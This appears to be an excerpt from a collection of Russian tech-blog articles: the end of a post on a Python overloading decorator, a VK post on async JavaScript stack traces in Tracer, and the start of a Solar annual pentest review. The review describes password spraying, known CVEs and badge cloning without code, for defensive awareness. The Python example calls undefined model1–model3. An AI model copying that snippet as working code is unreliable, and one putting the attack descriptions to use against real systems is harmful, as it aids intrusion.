перегрузку методов с учетом наследования (через __mro__, о чем ниже).Процесс регистрации функций и методов2. Анализ сигнатуры (OverloadFunction.register)После определения типа объекта мы анализируем его сигнатуру, чтобы зарегистрировать конкретную перегрузку. Анализ разбит на этапы:Извлечение типов параметровИспользуется inspect.signature, который возвращает объект Signature. Мы проходимcя по всем параметрам и извлекаем их аннотации типов, исключая *args и **kwargs (переменное число аргументов), так как они не участвуют в строгой перегрузке. Результат — кортеж типов, например: (int, str).Нормализация аннотаций (_normalize_annotation)Аннотации могут быть сложными (например, Union[int, str], List[str], Optional[float]), и их нужно привести к удобному виду:Обработка Union: Если тип — Union, мы вызываем get_origin (возвращает Union) и get_args (возвращает (int, str)), сохраняя подтипы для последующей проверки.Обработка generic-типов: Для List[str] get_origin вернет list, а get_args — (str,).Ленивые импорты: Если аннотация — объект LazyImport, мы оборачиваем её в LazyTypeWrapper, чтобы отложить разрешение типа до момента вызова.РезультатКаждый вариант перегрузки сохраняется в словаре self.overloads с ключом — кортежем типов, а значением — самой функцией.class OverloadFunction:     def __init__(self, name: str):         self.name = name         self.overloads = {}      def register(self, func) -> None:         # извлечение типов параметров         # нормализация аннотаций         # получение финального кортежа param_types                  self.overloads[param_types] = func 3. Вызов функции (OverloadFunction.__call__)Когда вызывается перегруженная функция, мы определяем, какая версия должна быть выполнена, по такому алгоритму:Сбор типов аргументовДля переданных аргументов (args) мы создаем кортеж их фактических типов с помощью tuple(type(arg) for arg in args). Например, вызов process(42, ""hello"") дает (int, str).Сопоставление типов (_match_types)Это сердце проверки, где сравниваются фактические типы аргументов с ожидаемыми типами параметров:Проверка длины: Если аргументов больше, чем параметров, это сразу несовпадение.Методы классов: Если первый параметр — self (пустая аннотация), он пропускается при сравнении, чтобы поддерживать методы.Обработка Union: Если параметр имеет тип Union[int, str], мы используем get_args для извлечения (int, str) и проверяем, является ли тип аргумента подклассом хотя бы одного из них через issubclass. Если в Union есть None, он исключается из проверки, если аргумент не None.Ленивые типы: Для LazyTypeWrapper мы пытаемся разрешить тип через resolve(). Если это не удается (например, из-за циклического импорта), сравниваем имена типов как запасной вариант.Generic-типы: Если параметр — list, проверяем, является ли аргумент подклассом list (через issubclass).Выбор функцииЕсли типы совпадают, мы используем inspect.signature(fn).bind_partial, чтобы привязать аргументы (включая значения по умолчанию), и вызываем функцию.class OverloadFunction:     ...      # Вызов обертки над оригинальной функцией     def __call__(self, *args, **kwargs) -> Any:         arg_types = # получаем типы аргументов из args          # Проходимся по всем элементам в self.overloads, если находим перегрузку,         # то возвращаем результат оригинальной функции:           return fn(*bound_args.args, **bound_args.kwargs)          # иначе:           raise TypeError(f""No match for types {arg_types}"")4. Поддержка наследования (OverloadManager.call)Для методов классов мы учитываем иерархию наследования:Если первый аргумент — объект класса, мы проверяем его тип через __class__ и проходим по цепочке базовых классов (__mro__). Например, если метод перегружен в базовом классе Base, а вызывается на объекте Derived, мы найдем подходящую версию.class OverloadManager:     ...      # Метод вызывается из функции-декоратора     def call(self, name, *args, **kwargs) -> Any:       # сначала пытаемся найти перегрузку среди функций       # если нашлась, то возвращаем:         return self.functions[name](*args, **kwargs)              # если первый аргумент это __class__,       # то ищем метод в классе и среди родительских классов,       # извлекаем название модуля и класса, затем возвращаем:         key = (module_name, class_name, name)         return self.methods[key](*args, **kwargs)              # иначе:         raise TypeError(f""No overloaded function '{name}' found."")Итоговая картинка вызова перегруженной функцииВызов функцииЧто получается в итогеfrom typing import Union, Optional from copy import deepcopy  import pandas as pd import numpy as np from sklearn.datasets import load_iris from sklearn.linear_model import LogisticRegression  from my_library.overloading import overload  # функция-декоратор перегрузки  DataFrame = Union[pd.DataFrame, np.ndarray] DataArray = Union[pd.Series, pd.Index, np.ndarray, list, tuple]  class Dataset:     ""Кастомный класс для работы с данными""      def __init__(self, data: DataFrame, target_column: str):         self.data = data         self.target_column = target_column         ...  class Model:     ""Кастомный класс для моделей""     def __init__(self, model):         self.model = model         self.features = None          @overload     def fit(self, dataset: Dataset, features: Optional[DataArray] = None, **kwargs):         self.features = (             self._get_features(dataset.data, dataset.target_column)             if features is None             else features         )         return self.fit(dataset.data[self.features], dataset.data[dataset.target_column], **kwargs)      @overload     def fit(self, X: DataFrame, y: DataArray, **kwargs):         self.features = self._get_features(X, None)         self.model.fit(X, y, **kwargs)         return self      @overload     def predict(self, dataset: Dataset, **kwargs):         return self.predict(dataset.data[self.features], **kwargs)      @overload     def predict(self, X: DataFrame, **kwargs):         return self.model.predict(X, **kwargs)          def _get_features(self, data: DataFrame, target_col: Optional[str]) -> list:         if hasattr(data, 'columns'):             if target_col is not None:                 return data.columns.drop(target_col).tolist()             return data.columns.tolist()         else:             return list(range(data.shape[1] - (1 if target_col is None else 0)))   X, y = load_iris(as_frame=True, return_X_y=True) dataset = Dataset(pd.concat([X, y], axis=1), 'target') sklearn_model = LogisticRegression(solver='liblinear', multi_class='ovr', random_state=42)  # Перегрузка сработает в зависимости от типов аргументов features = ['sepal length (cm)', 'sepal width (cm)', 'petal length (cm)', 'petal width (cm)'] model1.fit(dataset, features) model2.fit(dataset) model3.fit(X, y)  # Проверка на равенство np.array_equal(     model1.predict(dataset),      model2.predict(dataset) ) # True np.array_equal(     model2.predict(dataset),      model3.predict(dataset) ) # True np.array_equal(     model1.predict(dataset),      model1.predict(X) ) # TrueТеперь посмотрим на содержание нашего менеджера.В коде нашей библиотеки нам достаточно объявить один объект manager = OverloadManager(), далее в ней функция-декоратор overload будет регистрировать все перегрузки.>>> from my_library import overloading  >>> overloading.manager.methods {('__main__',   'Model',   'fit'): <my_library.overloading.OverloadFunction at 0x12fa82ec0>,  ('__main__',   'Model',   'predict'): <my_library.overloading.OverloadFunction at 0x14f8b0b80>}  # название модуля здесь `__main__` так как мы тестировали наши # перегрузки выше в jupyter notebook.Посмотрим теперь на конкретные перегрузки. Так как мы работаем с методами, а не функциями, то ключом к каждому из них будет кортеж, который состоит из названия модуля, класса и самой функции.>>> overloading.manager.methods[('__main__', 'Model', 'fit')].overloads {(inspect._empty,   __main__.Dataset,   typing.Union[pandas.core.series.Series, pandas.core.indexes.base.Index, numpy.ndarray, list, tuple, NoneType]): <function __main__.Model.fit(self, dataset: __main__.Dataset, features: Union[pandas.core.series.Series, pandas.core.indexes.base.Index, numpy.ndarray, list, tuple, NoneType] = None, **kwargs)>,  (inspect._empty,   typing.Union[pandas.core.frame.DataFrame, numpy.ndarray],   typing.Union[pandas.core.series.Series, pandas.core.indexes.base.Index, numpy.ndarray, list, tuple]): <function __main__.Model.fit(self, X: Union[pandas.core.frame.DataFrame, numpy.ndarray], y: Union[pandas.core.series.Series, pandas.core.indexes.base.Index, numpy.ndarray, list, tuple], **kwargs)>}  >>> overloading.manager.methods[('__main__', 'Model', 'predict')].overloads {(inspect._empty,   __main__.Dataset): <function __main__.Model.predict(self, dataset: __main__.Dataset, **kwargs)>,  (inspect._empty,   typing.Union[pandas.core.frame.DataFrame, numpy.ndarray]): <function __main__.Model.predict(self, X: Union[pandas.core.frame.DataFrame, numpy.ndarray], **kwargs)>}Технические моменты в реализации overload1. Работа с Union и OptionalUnion[int, str] разбирается на подтипы (int, str), и проверка проходит для каждого аргумента отдельно.Optional[float] (то есть Union[float, None]) обрабатывается так, чтобы None не мешал, если аргумент — float. Это делает перегрузку интуитивной.2. Ленивые импортыЕсли тип импортируется лениво (в нашем случае с LazyImport), мы не загружаем его сразу, а откладываем до момента вызова. Это решает проблему циклических зависимостей, так как использование from future import annotations ломает нашу реализацию.LazyImport: Наш кастомный класс для отложенного разрешения типов. В основном используется для решения проблем с циклическими импортами и также откладывает импорт тяжелых библиотек. При вызове resolve() он импортирует модуль и возвращает тип.3. Значения по умолчаниюБлагодаря bind_partial и apply_defaults мы корректно обрабатываем параметры с дефолтными значениями, даже если они не переданы в вызове.4. Обработка ошибокЕсли подходящей перегрузки не найдено, выбрасывается информативное исключение с указанием типов аргументов, что упрощает отладку.5. Работа с *args и **kwargsДля пропуска переменного числа аргументов, мы используем inspect.Parameter.VAR_POSITIONAL и inspect.Parameter.VAR_KEYWORD, сравнивая с ним все переданные аргументы.6. Пропуск self в методахЕсли первый параметр — self, мы пропускаем его при сравнении типов, чтобы поддерживать методы классов. Вычислить, является ли аргумент self, помогает сравнение с inspect.Parameter.empty.7. Различия в работе с методами и функциямиПри обработке функций достаточно хранить только их имена в менеджере, тогда как для методов требуется использовать кортеж, включающий имя метода, а также имена модуля и класса. Это обусловлено тем, что методы с одинаковыми именами в разных классах (за исключением случаев наследования) выполняют различные задачи. Например, в пользовательских классах Model для обучения и GridSearch для подбора гиперпараметров может быть метод fit(), но его назначение и реализация в каждом случае будет различным.Что ещё почитать по темеtyping — Support for type hints — Python documentation — официальная документация библиотеки typing для использования аннотаций типов (get_type_hints, get_origin, get_args).inspect — Inspect live objects — Python documentation — официальная документация модуля inspect для работы с объектами во время исполнения.PEP 484 — Type Hints — официальное описание синтаксиса аннотаций типов в Python.PEP 563 — postponed evaluation of type annotations — официальное описание отложенного разрешения аннотаций типов."
93,Решаем фундаментальную проблему асинхронных JavaScript-ошибок,VK,"Технологии, которые объединяют",0,"Мобильные технологии, Веб-сервисы, Игры и развлечения",2025-04-09,"Асинхронный JavaScript-код встречается практически в любом проекте (самый популярный пример использования — сетевые запросы). Но работа с ним сопряжена с рядом особенностей. Одна из них — специфичная работа с ошибками. Так, поскольку ошибки могут возникать в разное время и в разном месте, надо уметь их отлавливать, определять место «поломки» и корректно передавать всю информацию для последующей обработки. Для этого критически важно, чтобы stack trace ошибки был не формальный «однострочник», а максимально информативный.Меня зовут Александр Бавин. Я разработчик в команде Tracer, ОК. В этой статье я расскажу, какие проблемы создавал для нас недостаточно информативный stack trace, как мы пытались его дополнить и что выбрали в итоге.Первые ошибкиTracer — инструмент для аналитики ошибок в приложениях. С его помощью можно собирать данные об ошибках и зависаниях приложений, находить утечки памяти в приложении и на диске. Tracer позволяет профилировать приложения в проде для поиска критических мест в производительности. Важно, что инструмент ориентирован не только на поиск ошибок, но и на обнаружение их причин. Но при разработке Tracer мы сами нередко сталкивались с проблемами.Например, когда мы сделали первую версию Tracer JS SDK и подключили её к нашему UI, сразу обнаружили ряд ошибок, о которых даже не подозревали. Одной из них, например, была Error: Missing “:type” param.Если на нее детально посмотреть, сразу понятно, что произошло — находясь в таблице с фильтрами, мы пытались собрать путь для роутинга, но нужного параметра не нашлось.Обнаружение и устранение таких проблем — довольно простая задача, поскольку отчёт по ним достаточно подробный.Но наряду с синхронными ошибками мы столкнулись и с асинхронными. Например, запросы следующего вида. Подобным ошибкам характерны две глобальные проблемы:из-за асинхронной работы кода, информации о причинах ошибки минимум;вариантов, причин и даже мест появления ошибки может быть множество.По мере выполнения функций заполняется call stack. Но после выхода из очередной функции, call stack очищается. То есть, в конце задачи call stack оказывается пустым. Соответственно, при выполнении новой задачи, очередь не содержит никакой информации о предыдущих событиях.Как результат, разбираться с такими ошибками существенно сложнее. Поэтому возникает необходимость дополнять исходный stack trace более подробной информацией о цепочках async-вызовов.Поиск готовых решенийМы не могли допустить, чтобы ошибки в асинхронном коде оставались для нас «слепой зоной» — ни текущие, ни потенциально возможные. Поэтому нам было важно найти способ дополнить stack trace.В приоритете было сделать это максимально нативным способом, поэтому решили посмотреть на уже существующие готовые решения.Chrome DevToolsChrome DevTools — инструмент для отладки, оптимизации и понимания работы веб-приложений. Решение позволяет отлаживать JavaScript, анализировать время выполнения всех функций веб-приложения и не только.Появление Async-фичи в Chrome, 2014 годГлавное преимущество Chrome DevTools в том, что инструмент позволяет в рантайме получить полную информацию о цепочке async-вызовов.Вместе с тем, для наших задач решение не подходит, поскольку:событие происходит на стороне пользователя, то есть нельзя его открыть и посмотреть;к моменту получения отчёта события уже произошли;надо знать, как воспроизвести проблему.Node.jsNode.js — кроссплатформенная среда выполнения JavaScript, которую, среди прочего, можно использовать для асинхронного программирования. С 12 версии в Node.js есть нативная поддержка асинхронных стек трейсов — если в асинхронном коде произойдет ошибка, Node.js сразу покажет её причину.Нюанс в том, что мы работаем в браузере, а не в окружении Node.js. То есть решение нам также не подходит. Zone.jsZone.js — библиотека, которая используется в Angular. Она позволяет обнаруживать и перехватывать асинхронные операции, такие как обработка событий, таймеры, запросы на сервер и другие. Решение позволяет Angular отслеживать и управлять зонами выполнения (execution zones), что помогает в обнаружении изменений и обновлении представления.Важно, что Zone.js сохраняет информацию о цепочке async-вызовов. То есть это вполне рабочее решение. Вместе с тем, для нашего кейса и оно не было лучшим. Во-первых, Zone.js тесно связан с Angular, а для нас в приоритете инструмент, который подойдет для любого стека. Во-вторых, Zone.js предоставляет много информации, которая нам не нужна — в итоге она просто влияет на размер бандла.От решения также отказались.Таким образом, анализ показал, что конкретно для нашего кейса готового решения нет. Поэтому мы решили написать своё.Делаем своё решениеПри разработке нам было важно обеспечить, чтобы решение:сохраняло всю информацию о цепочке async-вызовов;не содержало ничего лишнего и не перегружало бандл;давало нам полный контроль для изменений и улучшений.Для реализации нужной нам фичи можно применять два подхода:Monkey Patch;Proxy.Подход Monkey Patch заключается в простой подмене оригинальной функции. При этом исходная функция сохраняется и вызывается внутри. Как пример — так можно сделать, чтобы при вызове console.log отображалось текущее время. console.log.testProp = 1; const originalLog = console.log;  console.log = function (...args) {    return originalLog(Date.now(), ...args); } console.log.testProp === 1; // falseПодход рабочий, но у него есть недостаток. Так, вместе с подменой оригинальной функции можно потерять имеющиеся свойства объекта и, как результат, сделать их недоступными.Подход с применением Proxy более продвинутый. Он подразумевает обертывание условного объекта и добавление определенных «ловушек» для отслеживания происходящих событий в вызове. В таком случае упомянутый выше код будет иметь следующий вид:console.log.testProp = 1; console.log = new Proxy(console.log, {    apply: function (target, thisArg, args) {        target.call(thisArg, Date.now(), ...args);    } }); console.log.testProp === 1; // trueГлавное достоинство подхода в том, что даже после оборачивания мы продолжаем обращаться к исходной функции. То есть случайное затрагивание свойств функции исключено.Вместе с тем, Proxy — относительно свежая фича и не поддерживается в старых браузерах, что для нас критично. Поэтому мы решили использовать Monkey Patch.Используем Monkey PatchПримечательно, что Monkey Patch — довольно простой метод. Так, зачастую достаточно обернуть вызываемый callback.const setTimeoutOriginal = window.setTimeout;  window.setTimeout = function tracerSetTimeout(    handler: TimerHandler,    timeout?: number,    ...args: any[] ): number {    return setTimeoutOriginal(        wrapHandler('setTimeout', handler),        timeout,        ...args    ); };В этой обертке мы можем получить дополнительную информацию. В том числе stack trace на момент постановки очередной задачи, который нас интересует. Этот stack trace мы сохраняем в некий scope (объект, в котором хранится текущий stack trace).А вызов оригинальной функции мы оборачиваем в try-catch. При обнаружении ошибки мы её перехватываем, дополняем своей информацией и передаём дальше. export function wrapHandler<T>(name: string, handler: T): T {    const scope = getCurrentScope(), stack = getCurrentStack();     return function tracerHandlerWrap(...args: any[]) {        initScope(name, stack, scope);         try {            const result = handler(...args);            endScope();            return result;        } catch (e) {            catchEndScope(e);            throw e;        }    }; }Пример примененияДля наглядности разберем пошаговый алгоритм на примере setTimeout, в котором мы парсим невалидный JSON. (function main() {    setTimeout(        function onTime() {            JSON.parse('wrong_json');        }    ); })();Примечание: Понятно, что здесь произойдёт ошибка. Но в классическом варианте мы не увидим, что мы пришли из функции main. Мы увидим только onTime. Оборачиваем setTimeout:(function main() {    (function wrapSetTimeout() {        return setTimeout(            function onTime() {                JSON.parse('wrong_json');            }        );    })(); })();Получаем текущий stack и scope:(function main() {    (function wrapSetTimeout() {        const scope = getCurrentScope(), stack = getCurrentStack();         return setTimeout(            function onTime() {                JSON.parse('wrong_json');            }        );    })(); })();Оборачиваем оригинальную функцию своей:(function main() {    (function wrapSetTimeout() {        const scope = getCurrentScope(), stack = getCurrentStack();         return setTimeout(            function wrapHandler(name: string) {                (function onTime() {                    JSON.parse('wrong_json');                })();            }        );    })(); })();Инициализируем scope, который берет stack trace той функции, которая ставила её в очередь:(function main() {    (function wrapSetTimeout() {        const scope = getCurrentScope(), stack = getCurrentStack();         return setTimeout(            function wrapHandler(name: string) {                initScope(name, stack, scope);                 (function onTime() {                    JSON.parse('wrong_json');                })();                 endScope();            }        );    })(); })();Оборачиваем в try/catch:(function main() {    (function wrapSetTimeout() {        const scope = getCurrentScope(), stack = getCurrentStack();         return setTimeout(            function wrapHandler(name: string) {                initScope(name, stack, scope);                 try {                    (function onTime() { JSON.parse('wrong_json');})();                } catch (error) {                    throw error;                }                 endScope();            }        );    })(); })();Цепляем scope к ошибке:(function main() {    (function wrapSetTimeout() {        const scope = getCurrentScope(), stack = getCurrentStack();         return setTimeout(            function wrapHandler(name: string) {                initScope(name, stack, scope);                 try {                    (function onTime() { JSON.parse('wrong_json');})();                } catch (error) {                    error.tracerScope = getCurrentScope();                    throw error;                }                 endScope();            }        );    })(); })();В результате, когда ошибка отправляется в Tracer, мы собираем всю информацию в один stack trace, и на выходе вместо однострочного call stack мы получаем подробный отчёт об ошибке, с полной цепочкой вызовов.Проблемы реализацииВ выбранной нами реализации фичи не обошлось и без «подводных камней». Остановимся на некоторых подробнее.ПроизводительностьДополнение stack trace ошибок в асинхронном коде неизбежно влияет на перформанс. Но на практике это влияние минимально. Чтобы продемонстрировать это, я подготовил небольшую демо-страницу, где можно посмотреть на параметры производительности с включенной и выключенной фичей. Спойлер — изменения незначительны, десятые доли миллисекунд. Соответственно, такую просадку перформанса мы можем игнорировать.Более того, фичу можно включать только на часть пользователей. В таком случае мы всё ещё будем получать дополнительную информацию о цепочке вызовов, но с меньшим влиянием на производительность в целом.Содержание stackПоскольку мы добавляем собственные обработчики, в stack попадает довольно много «мусора» — избыточной информации. SyntaxError: Unexpected token 'w', ""wrong_json"" is not valid JSON    at JSON.parse (<anonymous>)    at http://localhost:63342/async-demo/build/index.js:640:25    at tracerHandlerWrap (http://localhost:63342/async-demo/build/index.js:462:32) (Promise.then onFulfilled)    at getCurrentStack (http://localhost:63342/async-demo/build/index.js:446:31)    at wrapHandler (http://localhost:63342/async-demo/build/index.js:454:46)    at OriginalPromise.then (http://localhost:63342/async-demo/build/index.js:538:40)    at onTime (http://localhost:63342/async-demo/build/index.js:639:39)    at tracerHandlerWrap (http://localhost:63342/async-demo/build/index.js:462:32) (setTimeout)    at getCurrentStack (http://localhost:63342/async-demo/build/index.js:446:31)    at wrapHandler (http://localhost:63342/async-demo/build/index.js:454:46)    at tracerSetTimeout (http://localhost:63342/async-demo/build/index.js:504:35)    at HTMLButtonElement.perfTest (http://localhost:63342/async-demo/build/index.js:638:5)Поэтому всё лишнее важно удалять, приводя stack к состоянию, когда в нём будет только то, что пишет сам разработчик.SyntaxError: Unexpected token 'w', ""wrong_json"" is not valid JSON    at JSON.parse (<anonymous>)    at http://localhost:63342/async-demo/build/index.js:640:25 (Promise.then onFulfilled)    at onTime (http://localhost:63342/async-demo/build/index.js:639:39) (setTimeout)    at HTMLButtonElement.perfTest (http://localhost:63342/async-demo/build/index.js:638:5)Нативные async/awaitТакже мы столкнулись с проблемой нативных async/await. Например, у нас есть асинхронная функция, и мы вызываем её без добавления обработчиков. Таким образом, создается promise. Однако в этой ситуации promise создается не из глобального конструктора промисов, а каким-то другим способом. Мы пропатчили конструктор, но можем не получить необходимую информацию. Но для нашего кейса эти особенности не страшны. Обусловлено это тем, что вызов асинхронных функций редко осуществляется без добавления обработчиков. Например, await.Или then.В случае с await мы дожидаемся результата в функции-обертке. А then пропатчен на прототипе, и, несмотря на специфическое создание Promise на нативном уровне, используется пропатченный прототип. Таким образом, мы можем восстанавливать всю картину и дополнять stack trace. Наши результатыОписанная фича уже доступна в Tracer. Причем, благодаря модульности нашего инструмента, для её подключения достаточно одной строки кода — после этого всё пропатчится автоматически. import {    initTracerError,    initTracerErrorAsyncStack,    initTracerErrorUploader } from '@tracer/sdk';  initTracerErrorAsyncStack(); // добавляем модуль initTracerError(); initTracerErrorUploader({    appToken: 'Токен из настроек',    versionName: 'my-version',    versionCode: 1 });Благодаря новой фиче Tracer позволяет ещё лучше справляться с задачами анализа ошибок и помогает быстрее их исправлять.Краткое послесловиеРабота с асинхронным кодом часто сложнее для разработчиков. Особенно, если речь идёт о поиске ошибок и их причин. Сложностей может добавлять и тот факт, что у каждого проекта есть своя специфика, которая может накладывать дополнительные ограничения или предъявлять свои требования к инструменту для работы с вызовами.Вместе с тем, даже в самых сложных случаях поиск ошибок и причин их появления в асинхронном коде возможен. Это наглядно демонстрирует и наш опыт: c Tracer мы смогли удовлетворить всем требования продукта и получить полную информацию о цепочке вызовов."
94,"Год прошел, а «дыры» все там же: аналитический обзор уязвимостей информационных систем российских компаний в 2024 году",Солар,Безопасность за нами,0,"Программное обеспечение, Информационная безопасность",2025-04-09,"Годы идут, ИТ стремительно развиваются, но что-то в этом мире остается неизменным. И это – «любимые» пентестерами «дыры» в информационной безопасности. Анализ результатов более 200 проектов 2024 года показал, что распространенные критичные проблемы вроде слабых паролей и устаревших версий ПО, о которых мы рыдаем сигнализируем из года в год в наших отчетах, все еще остаются актуальными для многих компаний, и все еще открывают хакеру путь к внутренней инфраструктуре, важным данным, значимым системам и другим активам.В этом посте мы поделимся статистикой, примерами из практики и расскажем о самых распространенных проблемах информационной безопасности.//пентестер и «дыра» в безопасности Мы выделили наиболее интересные численные показатели, больше цифр и диаграмм – в нашем годовом аналитическом отчете. Как обычно, для удобства и наглядности мы разделили результаты по блокам в зависимости от типа работ.Внешний пентестВнешнее тестирование на проникновение направлено на поиск уязвимостей и недостатков с высоким уровнем критичности, которые могут позволить определить и реализовать успешные векторы получения доступа во внутреннюю сеть или к критичным внешним системам компании. При проведении работ моделируются действия потенциального внешнего нарушителя, не обладающего данными об инфраструктуре. Подобный подход позволяет получить независимую оценку эффективности методов и средств защиты информации в компании.Основные результаты работМы проанализировали результаты выполненных в 2024 году проектов по внешнему пентесту и пришли к выводу, что внешний периметр 91% изученных компаний уязвим к атакам, успешная реализация которых может привести к получению доступа во внутреннюю сеть, к чувствительным данным и/или критичным внешним системам и приложениям, а также к компрометации узлов внешнего периметра. При этом всего у 12% компаний уровень защищенности внешнего периметра были оценен как высокий. То есть почти в каждой девятой компании на внешнем периметре имелись уязвимости и недостатки высокой и средней степени критичности, позволяющие получить доступ во внутреннюю сеть или к критичным внешним системам и данным.Более того, для нанесения ущерба информационным и финансовым активам, а также репутации компании злоумышленнику далеко не всегда обязательно преодолевать внешний периметр. Например, в одном из проектов в результате атаки Password Spraying были успешно получены учетные данные доменного пользователя, позволившие выполнить выгрузку адресной книги и провести повторную атаку подбора пароля, которая привела к получению учетных данных более 80 доменных пользователей. Эти учетные данные в свою очередь позволили получить доступ к различным критичным системам (системе 1С, внешней системе видеоконференцсвязи и др.) и чувствительной информации, в том числе к финансовой информации в содержимом почтовых ящиков сотрудников. При этом преодоление внешнего периметра для получения указанных доступов не требовалось.Еще пример ситуации, при которой для нанесения ущерба финансовым и репутационным активам не требовалось преодоление внешнего периметра: в ходе проекта было обнаружено приложение с функциональностью записи пользователей на получение предоставляемых компанией услуг. Для подтверждения записи пользователь должен ввести единоразовый код из SMS. При этом в приложении имелись недостатки бизнес-логики, позволяющие обойти проверку кода и записать на получение услуг пользователей без их ведома. Таким образом, компания получает неактуальные заявки на услуги и не может адекватно оценить загрузку специалистов, а реальные пользователи лишаются возможности получить услугу.Распространенные критичные уязвимости внешних периметров Именно уязвимости и недостатки высокой степени критичности могут позволить определить и реализовать успешные векторы преодоления внешнего периметра. ТОП «критов» внешних периметров российских компаний в минувшем году получился такой:Ни разу не было и вот опять: по классике на первых местах ТОПа, как и год назад, слабые пароли и уязвимости устаревших версий программного обеспечения.  Именно эти две категории возглавляют топ-5 критичных уязвимостей уже более трех лет.Пользователи по-прежнему используют слабые пароли и пароли по умолчанию вроде password, admin, user1, demo, простых последовательностей чисел и др., что упрощает проведение атак подбора учетных данных и получение доступа к критичным системам. А доступ к таким системам может позволить выполнить произвольный код на узлах внешнего периметра и получить доступ во внутреннюю сеть. Именно использование слабых паролей послужило начальной точкой успешного вектора в 19% случаев.//пентестер, когда в очередной раз видит пароль «12345» Вторая наша «любимая» проблема – использование ПО с известными уязвимостями. В минувшем году мы встречали на внешних периметрах уязвимые версии ПО Liferay, 1С-Битрикс, Pentaho, Cisco ExpressWay, CMS Битрикс, Microsoft Exchange, Avaya Aura, Jira и др. Уязвимости в устаревших версиях программного обеспечения стали началом успешного вектора преодоления внешнего периметра в 25% случаев.Также хотим обратить внимание на уязвимости, приводящие к возможности проведения атак «Внедрение SQL-кода в запросы к базе данных», которые встретились в 24% проектов и стали отправной точкой почти четверти успешных векторов преодоления внешнего периметра (22% векторов). Пример вектора с использованием атак внедрения SQL-кода:В большинстве случаев на внешнем периметре присутствуют уязвимости и недостатки, позволяющие реализовать как минимум 2 вектора его преодоления. А максимальное количество векторов в одном проекте составило 8, причем начальной точкой 3-х из них стала эксплуатация известных уязвимостей в устаревших версиях ПО, еще в 3-х – проблемы, связанные с использованием слабых паролей, и в 2-х – возможность проведения атак «Внедрение SQL-кода в запросы к базе данных». Это, в свою очередь, открывает больше возможностей для подготовки и реализации атак, а также повышает вероятность успешного преодоления внешнего периметра.Дополнительные наблюдения Дополнительно хотим поделиться некоторыми общими наблюдениями, на которые считаем важным обратить внимание. Во-первых, отсутствие на внешнем периметре критичных уязвимостей и недостатков на момент проведения работ не гарантирует, что уровень защищенности не может снизиться в дальнейшем. Это связано с тем, что периметр компании не является статичным: появляются новые приложения и сервисы, которые могут быть подвержены уязвимостям и недостаткам. Например, обнаружение уязвимостей нулевого дня в используемых приложениях, изменение конфигурации внешних систем и др. Во-вторых, мы по-прежнему наблюдаем сохранение настораживающей тенденции: выявленные в процессе тестирования уязвимости не устраняются и повторно обнаруживаются в ходе ретестов.Однако есть и хорошие новости: некоторые компании серьезно подходят к защите своих информационных активов и проводят существенную работу по устранению выявленных в ходе пентестов уязвимостей и недостатков. Так, для трети компаний, на внешнем периметре которых не было обнаружено уязвимостей и недостатков, позволяющих получить доступ во внутреннюю сеть или к критичным данным и внешним системам, ранее неоднократно проводились работы по внешнему и внутреннему пентесту. Регулярное проведение таких работ позволило своевременно выявить и устранить критичные уязвимости и недостатки и таким образом повысить уровень защищенности как внешнего периметра, так и внутренней сети.//сотрудники заказчика устраняют выявленные пентестерами уязвимостиПоэтому хотим напомнить, что для обеспечения безопасности информационных активов важно своевременно устранять выявленные уязвимости и недостатки в соответствии с приведенными в отчете по итогам работ рекомендациями.Внутреннее тестирование на проникновение Внутреннее тестирование на проникновение направлено на проверку возможности повышения привилегий во внутренней сети, получения доступа к критичной информации или внутренним системам. При проведении работ моделируются действия потенциального нарушителя, получившего тем или иным способом доступ во внутреннюю сеть организации. Подобный подход позволяет получить независимую оценку эффективности методов и средств защиты информации в компании.Основные результаты работВ 91% проектов по внутреннему пентесту были достигнуты поставленные цели. В большинстве случаев основной целью было получение контроля над доменом. Однако заказчиками ставились и иные цели. Например - получение доступа к различным информационным системам и базам данных во внутренней сети, к инфраструктурам резервного копирования, виртуализации, VPN и SIEM и другим критичным системам. Подобный подход говорит о том, что компании уделяют все больше внимания защите своих информационных активов во внутренней сети, что не может не радовать. Однако только в 9% случаев уровень защищенности внутренней сети был оценен как высокий. То есть в каждой девятой компании злоумышленник может повысить привилегии и/или получить доступ к различным критичным системам и данным во внутренней сети.Распространенные критичные уязвимости внутренних сетейВекторы повышения привилегий и получения доступа к различным системам и данным во внутренней сети начинаются с эксплуатации критичных уязвимостей и недостатков. В минувшем году во внутренних сетях наиболее часто нам встречались следующие криты:Картина та же, что и с внешним периметром: главной проблемой внутренних сетей российских компаний в 2024 году внезапно стали слабые пароли и уязвимое ПО. Тенденция использования слабых и повторяющихся паролей остается неизменной уже несколько лет. Именно недостатки, связанные с использованием слабых паролей, послужили началом успешного вектора получения контроля над доменом в 30% случаев. Как говорится, самое уязвимое место в автомобиле – прокладка между рулем и сиденьем. Так и в нашем случае – человеческий фактор все так же остается одной из самых уязвимых составляющих.//хакер не пройдетНе менее существенным недостатком оказалось повторное использование паролей. Например, в некоторых проектах этот недостаток позволил получить контроль сразу над несколькими доменами с помощью одного вектора атаки. Так, в ходе работ мы скомпрометировали учетную запись пользователя, входившего в группу администраторов домена, и получили контроль над доменом. Далее полученные учетные данные были проверены в других доменах и оказались действительными, что привело к компрометации еще нескольких доменов.Во внутренних сетях по-прежнему используется ПО с известными уязвимостями, например, MS17-010, CVE-2019-0708, CVE-2021-1675, CVE-2021-36942 и многими другими. Встречающиеся уязвимости открывают для злоумышленника возможности выполнения произвольного кода на узлах внутренней сети, в том числе с повышенными привилегиями, проведения атак «принуждение к аутентификации», чтения произвольных файлов на уязвимом узле без прохождения аутентификации.Кроме того, актуальной проблемой внутренних сетей в 2024 году стала некорректная настройка ACL (Access control lists). Эксплуатация указанного недостатка может привести к компрометации различных систем и сервисов во внутренней сети и даже к получению контроля над доменом. Также распространенными остаются недостатки, связанные с некорректной конфигурацией шаблонов сертификатов. Они послужили началом 19% успешных векторов.Интересные особенности проектов по внутреннему пентесту В минувшем году в рамках проектов по внутреннему пентесту мы решали разные нетиповые задачи, которые считаем важным упомянуть, так как успешная реализация подобных векторов проникновения также может повлечь существенный ущерб для компании. Поэтому не следует исключать их из рисков ИБ. Так, в ходе ряда проектов мы проводили проверку возможности получения доступа на территорию заказчика путем клонирования пропусков сотрудников. В результате было выявлено, что компании, для которых проводились такие работы, используют устаревшие технологии, уязвимые к атакам дистанционного клонирования пропусков. Например, в ходе одного из проектов мы успешно клонировали пропуск сотрудника ИТ-департамента и под покровом ночи вломились в серверную получили доступ к критичному объекту в офисе заказчика. При этом факт клонирования пропуска и проникновения постороннего человека на критичный объект не был замечен службой безопасности, а пропуск не был заблокирован.//пентестеры получают доступ к критичному объекту в офисе заказчикаЕще одна задача – анализ беспроводных сетей. В ряде 